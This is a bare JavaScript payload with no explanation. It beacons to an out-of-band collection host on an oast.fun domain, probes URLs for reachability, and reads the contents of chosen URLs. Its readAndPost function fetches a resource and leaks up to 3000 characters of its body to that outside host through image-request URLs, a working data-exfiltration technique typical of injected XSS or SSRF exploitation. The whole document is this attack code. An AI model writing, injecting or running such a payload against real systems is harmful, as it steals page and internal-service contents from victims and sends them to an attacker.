var OOB = "https://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun";
function ping(p){ try { (new Image()).src = OOB + "/hp/" + p; } catch(e){} }
ping("js-origin-" + location.protocol);
function readAndPost(u, tag){
  fetch(u, {cache:"no-store"}).then(function(r){ return r.text(); })
    .then(function(t){ ping("READ-" + tag + "-len" + (t||"").length); (new Image()).src = OOB + "/body/" + tag + "?q=" + encodeURIComponent((t||"").slice(0,3000)); })
    .catch(function(e){ ping("readfail-" + tag); });
}
function probe(u, tag){
  fetch(u, {mode:"no-cors", cache:"no-store"}).then(function(){ ping("ok-" + tag); }).catch(function(){ ping("err-" + tag); });
}
